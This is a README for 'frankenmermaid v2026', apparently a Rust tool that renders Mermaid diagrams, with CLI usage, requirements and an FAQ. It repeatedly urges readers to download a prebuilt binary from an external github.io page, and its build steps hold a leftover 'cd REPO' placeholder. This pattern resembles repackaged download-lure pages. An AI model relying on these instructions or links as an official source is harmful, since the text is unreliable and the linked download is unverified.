# frankenmermaid v2026 - diagram engine 2026

> **Mermaid-compatible diagram engine for Rust, CLI, SVG, terminal, and WASM workflows, built for deterministic output and version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Rust%2C%20CLI%2C%20SVG%2C%20WASM-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/coopercaleb1993/frankenmermaid-v2026-engine?style=flat-square)](https://github.com/coopercaleb1993/frankenmermaid-v2026-engine)

---

<p align="center">
  <a href="https://coopercaleb1993.github.io/frankenmermaid-v2026-engine/">
    <img src="https://img.shields.io/badge/Download-frankenmermaid%20Latest-brightgreen?style=for-the-badge" alt="Download frankenmermaid">
  </a>
</p>

> **[Download Latest Build](https://coopercaleb1993.github.io/frankenmermaid-v2026-engine/)**

---

[Download Latest Build](https://coopercaleb1993.github.io/frankenmermaid-v2026-engine/)

---

## Overview

frankenmermaid is a Rust diagram engine for taking Mermaid-style source and producing stable, predictable visuals. It is aimed at workflows where output consistency matters, while still giving useful diagnostics and a command-line experience that works well for both local use and embedding.

The same pipeline can serve several destinations. You can generate SVG for documents, use terminal output for fast checks, rely on Canvas2D for browser-adjacent rendering, or target WASM for integration into other environments. That makes frankenmermaid a practical option when one diagram source needs to travel across multiple rendering surfaces.

---

## What it provides

- Mermaid-compatible rendering for everyday diagram tasks
- Parsing that understands intent and reports diagnostics for structural problems
- Repeatable layouts for consistent visual output
- Several layout algorithms suited to different diagram structures
- Export paths for SVG, terminal, Canvas2D, and WASM
- CLI commands for detect, parse, render, validate, and capabilities
- DOT bridge support for graph interchange
- Incremental layout pipeline for staged processing

---

## Installation

To build from source, clone the repository and compile it with Rust:

    git clone https://github.com/coopercaleb1993/frankenmermaid-v2026-engine.git
    cd REPO
    cargo build --release

After the build completes, you can try the CLI locally:

    cargo run -- --help

If you prefer a packaged artifact, download the latest release from the project page and run the binary or web build provided for your platform.

---

## Using the CLI

A common command sequence is to inspect the file first, then parse, validate, and render it:

    frankenmermaid detect diagram.mmd
    frankenmermaid parse diagram.mmd
    frankenmermaid validate diagram.mmd
    frankenmermaid render diagram.mmd -o output.svg

To list supported capabilities:

    frankenmermaid capabilities

For fast text-based previews, render to the terminal. If you are integrating with browser or application runtimes, use the WASM output path or the Canvas2D-oriented pipeline, depending on the host.

---

## Configuration model

frankenmermaid is driven mostly through CLI arguments and the diagram input itself. Rendering mode, output destination, and validation behavior are chosen per command instead of being controlled by one broad global profile.

When your build system or integration layer needs settings, keep them near the command call or inside the wrapper that launches the engine. That approach makes it simpler to swap between SVG, terminal, and WASM outputs without rewriting the diagram content.

---

## Requirements

- A Rust toolchain for building from source
- A system capable of running the CLI or loading the chosen output target
- Sufficient memory and storage for your diagram files and generated assets
- Optional browser or host runtime support when using WASM or Canvas2D output
- DOT-compatible tooling only if you plan to use the bridge workflow

---

## FAQ

**How can I check whether a diagram will work?**  
Start with the detect and validate commands. They show how the parser reads the input before any rendering step happens.

**Is it possible to switch output formats?**  
Yes. The engine can produce SVG, terminal output, Canvas2D output, and WASM output.

**Why does a rendered diagram look different from what I expected?**  
Review parser diagnostics, confirm the selected layout algorithm, and double-check the source syntax. Deterministic layout improves repeatability, but the command and target still influence the final result.

**Where do I get the newest build?**  
Use the latest build link above, or follow the repository release flow whenever a new version is published.

**Who is this aimed at?**  
It fits Rust developers, CLI users, and teams that need one diagram engine for several presentation targets.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
